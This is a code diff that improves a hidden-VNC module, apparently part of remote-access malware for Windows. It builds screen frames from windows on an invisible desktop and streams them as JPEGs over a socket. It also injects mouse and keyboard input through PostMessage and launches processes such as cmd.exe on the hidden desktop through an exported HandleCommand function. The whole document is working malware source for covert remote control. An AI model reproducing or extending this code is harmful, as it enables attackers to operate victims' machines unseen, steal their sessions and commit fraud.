@@ -239,7 +239,6 @@ static void capture_loop() {
         return;
     }
 
-    send_status("Window compositing capture started");
     while (g_captureRunning) {
         DWORD start = GetTickCount();
         int scale, fps;
@@ -254,22 +253,19 @@ static void capture_loop() {
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
 
-        // Final Frame Bitmap
         HDC hdcScreen = GetDC(NULL);
         HDC hdcMem = CreateCompatibleDC(hdcScreen);
         HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
         HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
 
-        // Background
         RECT fullRect = {0, 0, sw, sh};
-        HBRUSH hBrushBg = CreateSolidBrush(RGB(45, 45, 45)); // Modern dark grey
+        HBRUSH hBrushBg = CreateSolidBrush(RGB(45, 45, 45));
         FillRect(hdcMem, &fullRect, hBrushBg);
         DeleteObject(hBrushBg);
 
-        // Enum windows and draw them bottom to top
         vector<WindowInfo> windows;
         EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
-        reverse(windows.begin(), windows.end()); // Bottom-to-top order
+        reverse(windows.begin(), windows.end());
 
         for (const auto& win : windows) {
             int ww = win.rect.right - win.rect.left;
@@ -280,24 +276,20 @@ static void capture_loop() {
             HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
             HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);
 
-            // Capture window content
-            if (PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
-                BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
-            } else {
-                // Fallback for windows that don't support PrintWindow well
+            if (!PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
                 HDC hdcRealWin = GetDC(win.hwnd);
                 if (hdcRealWin) {
-                    BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
+                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                     ReleaseDC(win.hwnd, hdcRealWin);
                 }
             }
+            BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
 
             SelectObject(hdcWin, hOldWin);
             DeleteObject(hbmpWin);
             DeleteDC(hdcWin);
         }
 
-        // Scale to final size
         int dw = (sw * scale) / 100;
         int dh = (sh * scale) / 100;
         if (dw < 1) dw = 1; if (dh < 1) dh = 1;
@@ -305,46 +297,32 @@ static void capture_loop() {
         HDC hdcFinal = CreateCompatibleDC(hdcScreen);
         HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
         HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);
-
         SetStretchBltMode(hdcFinal, HALFTONE);
         StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
 
         vector<unsigned char> jpeg;
         if (bitmap_to_jpeg(hbmpFinal, 50, jpeg)) {
-            if (!safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg)) {
-                g_captureRunning = false;
-            }
+            safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg);
         }
 
-        // Cleanup
         SelectObject(hdcFinal, hOldFinal);
         DeleteObject(hbmpFinal);
         DeleteDC(hdcFinal);
-
         SelectObject(hdcMem, hOldMem);
         DeleteObject(hbmpMem);
         DeleteDC(hdcMem);
-
         ReleaseDC(NULL, hdcScreen);
 
         DWORD elapsed = GetTickCount() - start;
         DWORD interval = 1000 / (fps > 0 ? fps : 1);
         if (elapsed < interval) Sleep(interval - elapsed);
     }
-    send_status("Capture stopped");
 }
 
 static void input_loop() {
     ensure_desktop();
-    if (!g_hHiddenDesktop) {
-        g_inputRunning = false;
-        return;
-    }
-
-    if (!SetThreadDesktop(g_hHiddenDesktop)) {
-        g_inputRunning = false;
-        return;
-    }
+    if (!g_hHiddenDesktop) { g_inputRunning = false; return; }
+    if (!SetThreadDesktop(g_hHiddenDesktop)) { g_inputRunning = false; return; }
 
     while (g_inputRunning) {
         InputTask task;
@@ -356,19 +334,44 @@ static void input_loop() {
             g_inputQueue.pop();
         }
 
+        int x = task.cmd.value("x", 0);
+        int y = task.cmd.value("y", 0);
+        POINT pt = {x, y};
+        HWND targetHwnd = WindowFromPoint(pt);
+        if (!targetHwnd) continue;
+
+        POINT clientPt = pt;
+        ScreenToClient(targetHwnd, &clientPt);
+        LPARAM mouseLParam = MAKELPARAM(clientPt.x, clientPt.y);
+
         if (task.action == "hvnc_mousemove") {
-            SetCursorPos(task.cmd.value("x", 0), task.cmd.value("y", 0));
+            PostMessageW(targetHwnd, WM_MOUSEMOVE, 0, mouseLParam);
+            SetCursorPos(x, y);
         } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
-            int x = task.cmd.value("x", 0), y = task.cmd.value("y", 0), btn = task.cmd.value("button", 0);
-            DWORD flags = 0;
+            int btn = task.cmd.value("button", 0);
+            UINT msg = 0;
+            WPARAM wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+
             if (task.action == "hvnc_mousedown") {
-                flags = (btn == 0) ? MOUSEEVENTF_LEFTDOWN : (btn == 1 ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_MIDDLEDOWN);
+                msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
+                SetFocus(targetHwnd);
+                SetForegroundWindow(targetHwnd);
             } else {
-                flags = (btn == 0) ? MOUSEEVENTF_LEFTUP : (btn == 1 ? MOUSEEVENTF_RIGHTUP : MOUSEEVENTF_MIDDLEUP);
+                msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
             }
-            mouse_event(flags, x, y, 0, 0);
+            PostMessageW(targetHwnd, msg, wParam, mouseLParam);
         } else if (task.action == "hvnc_keydown" || task.action == "hvnc_keyup") {
-            keybd_event((BYTE)task.cmd.value("keycode", 0), 0, (task.action == "hvnc_keyup" ? KEYEVENTF_KEYUP : 0), 0);
+            int vk = task.cmd.value("keycode", 0);
+            HWND focusHwnd = GetFocus();
+            if (!focusHwnd) focusHwnd = GetForegroundWindow();
+            if (!focusHwnd) focusHwnd = targetHwnd;
+
+            if (task.action == "hvnc_keydown") {
+                PostMessageW(focusHwnd, WM_KEYDOWN, vk, 0);
+                PostMessageW(focusHwnd, WM_CHAR, vk, 0);
+            } else {
+                PostMessageW(focusHwnd, WM_KEYUP, vk, 0);
+            }
         }
     }
 }
@@ -416,19 +419,21 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             ensure_desktop();
             if (!g_hHiddenDesktop) return;
 
-            wstring wpath = utf8_to_wstring(cmd.value("path", "cmd.exe"));
-            vector<wchar_t> pathBuffer(wpath.begin(), wpath.end());
-            pathBuffer.push_back(L'\0');
+            wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
+            vector<wchar_t> cmdLine(path.begin(), path.end());
+            cmdLine.push_back(L'\0');
 
             wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-
             STARTUPINFOW si = { sizeof(si) };
             si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+            si.dwFlags = STARTF_USESHOWWINDOW;
+            si.wShowWindow = SW_SHOW;
+
             PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, pathBuffer.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-                send_status("Process started on: " + string(fullDesktopName.begin(), fullDesktopName.end()));
+                send_status("Process started on hidden desktop");
             } else {
                 send_error("Failed to start process. Error: " + to_string(GetLastError()));
             }
